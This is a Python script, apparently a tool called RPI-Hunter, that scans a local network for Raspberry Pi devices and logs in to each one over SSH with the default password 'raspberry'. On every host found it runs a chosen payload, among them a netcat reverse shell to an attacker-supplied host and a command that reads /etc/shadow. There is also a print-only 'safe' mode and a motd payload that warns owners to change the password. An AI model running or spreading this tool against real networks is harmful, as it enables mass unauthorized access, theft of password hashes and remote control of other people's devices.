#!/usr/bin/python
# -*- coding: utf-8 -*-
import os
import argparse
from termcolor import colored, cprint

main_color='green'
sub_color='blue'
line_color='red'
print '\n'
cprint("██████╗ ██████╗ ██╗      ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗ ", main_color)
cprint("██╔══██╗██╔══██╗██║      ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗", main_color)
cprint("██████╔╝██████╔╝██║█████╗███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝", main_color)
cprint("██╔══██╗██╔═══╝ ██║╚════╝██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗", main_color)
cprint("██║  ██║██║     ██║      ██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║", main_color)
cprint("╚═╝  ╚═╝╚═╝     ╚═╝      ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝", main_color)
cprint("-----------------------------------------------------------------------------", line_color)
cprint("      BusesCanFly                                           76 32 2e 30      ", sub_color)
cprint("-----------------------------------------------------------------------------", line_color)
print '\n'

parser = argparse.ArgumentParser()
parser.add_argument('--no-scan', dest='no_scan', action='store_true',
                    help='Disable ARP scanning')

parser.add_argument('-r', dest='ip_range', type=str, default='--localnet',
                    help='IP range to scan')
parser.add_argument('-f', dest='ip_list', type=str, default='./scan/RPI_list',
                    help='IP list to use (Default ./scan/RPI_list)')

parser.add_argument('-c', dest='creds', type=str, default='raspberry',
                    help='Password to use when ssh\'ing')

parser.add_argument('--list', action='store_true',
                   help='List avalible payloads')
parser.add_argument('--payload', type=str, default='whoami',
		    help='(Name of or raw) Payload [ex. whoami or reverse_shell')

parser.add_argument('-H', dest='host', type=str,
                    help='(If using reverse_shell payload) Host for reverse shell')
parser.add_argument('-P', dest='port', type=str,
                    help='(If using reverse_shell payload) Port for reverse shell')

parser.add_argument('--safe', action='store_true',
		   help='Print sshpass command, but don\'t execute it')
args = parser.parse_args()

#payload= 'echo "raspberry" | sudo -S whoami'

payloads={
'reverse_shell':'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc '+str(args.host)+' '+str(args.port)+' >/tmp/fC',
'apt_update':'sudo apt update && sudo apt -y upgrade',
'raincow_install':'sudo apt -y install fortune cowsay lolcat',
'raincow':'fortune | cowsay | lolcat',
'gitpip':'sudo apt -y install git python-pip',
'shadow':'sudo cat /etc/shadow',
'motd':'echo "CHANGE YOUR PASSWORD" > /etc/motd',
}

if args.payload in payloads:
	payload=payloads[args.payload]
else:
	payload=args.payload

def list():
        l=0
        cprint("Payloads:", "green")
	print colored("Specify with --payload", "green"), colored("name\n", "yellow")
	for key,value in payloads.items():
		print colored('['+key+']', 'yellow'), colored(value, 'white')

def scan():
	if not args.no_scan and not args.safe:
                os.system('sudo arp-scan -g '+args.ip_range+' -W ./scan/scan.pcap')
                os.system('tshark -r ./scan/scan.pcap > ./scan/pcap.txt 2>/dev/null')
                os.system('cat ./scan/pcap.txt | grep -i "Rasp" > ./scan/raspi_list')
                os.system('awk \'{print $8}\' ./scan/raspi_list > ./scan/RPI_list')
                os.system('rm -rf ./scan/scan.pcap && rm -rf ./scan/pcap.txt && rm -rf ./scan/raspi_list')
                cprint('\nLocated '+ str(sum(1 for line in open ('./scan/RPI_list'))) + ' Raspi\'s', 'yellow')

def RPI():
	if args.safe:
        	raw_input('\nPress enter to continue')
	cprint('\nLoaded '+ str(sum(1 for line in open (args.ip_list))) + ' IP\'s\n\n', 'yellow')

        list = args.ip_list
        with open(list) as inf:
                lines = [line.strip() for line in inf]
        i=0
	cprint("Sending payload to Pi\'s", "yellow")
	cprint("Godspeed, little payloads\n", "green")

        while i < len(lines):
		print colored("Sending payload to ", "yellow"), colored(lines[i], "yellow")
		if args.safe:
			print("sshpass -p \""+args.creds+"\" ssh -o StrictHostKeyChecking=no pi@"+lines[i]+" "+payload)
		else:
			os.system("sshpass -p \""+args.creds+"\" ssh -o StrictHostKeyChecking=no pi@"+lines[i]+" "+payload)
			print("\n")
		i+=1
	exit

if args.list:
	list()
else:
	scan()
	RPI()
